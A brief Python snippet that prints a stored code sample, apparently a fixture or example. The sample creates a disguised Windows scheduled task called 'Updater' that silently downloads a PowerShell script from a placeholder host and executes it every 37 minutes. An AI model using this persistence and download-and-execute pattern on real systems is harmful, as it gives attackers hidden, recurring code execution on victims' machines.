example = 'import subprocess\n\ndef schedule():\n    subprocess.run(["schtasks", "/Create", "/TN", "Updater", "/SC", "MINUTE", "/MO", "37", "/TR",\n        "powershell -NoProfile -WindowStyle Hidden -Command iwr "\n        "https://example.invalid/update.ps1 "\n        "-UseBasicParsing | iex"])\n'
print(example)
